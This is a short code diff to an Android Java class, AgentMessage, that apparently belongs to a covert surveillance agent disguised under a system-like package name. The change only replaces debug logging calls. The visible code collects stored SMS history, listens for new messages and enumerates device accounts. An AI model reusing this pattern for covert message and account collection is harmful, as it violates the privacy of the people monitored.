@@ -15,7 +15,6 @@ import java.util.Iterator;
 
 import android.accounts.Account;
 import android.accounts.AccountManager;
-import android.util.Log;
 
 import com.android.service.LogR;
 import com.android.service.Mms;
@@ -29,6 +28,7 @@ import com.android.service.evidence.Markup;
 import com.android.service.interfaces.Observer;
 import com.android.service.interfaces.SmsHandler;
 import com.android.service.listener.ListenerSms;
+import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 import com.android.service.util.DateTime;
 import com.android.service.util.Utils;
@@ -54,7 +54,7 @@ public class AgentMessage extends AgentBase implements Observer<Sms> {
 
 		// Abbiamo gia' catturato lo storico
 		if (storedImsi.isMarkup() == false) {
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " (begin): cattura sms di storico");
+			if(Cfg.DEBUG) Check.log( TAG + " (begin): cattura sms di storico");
 
 			SmsBrowser smsBrowser = new SmsBrowser();
 			ArrayList<Sms> listSms = smsBrowser.getSmsList();
@@ -119,7 +119,7 @@ public class AgentMessage extends AgentBase implements Observer<Sms> {
 		for (final Account account : accounts) {
 
 			final String name = account.name;
-			if(Cfg.DEBUG) Log.d("QZ", TAG + name);
+			if(Cfg.DEBUG) Check.log( TAG + name);
 		}
 	}
 
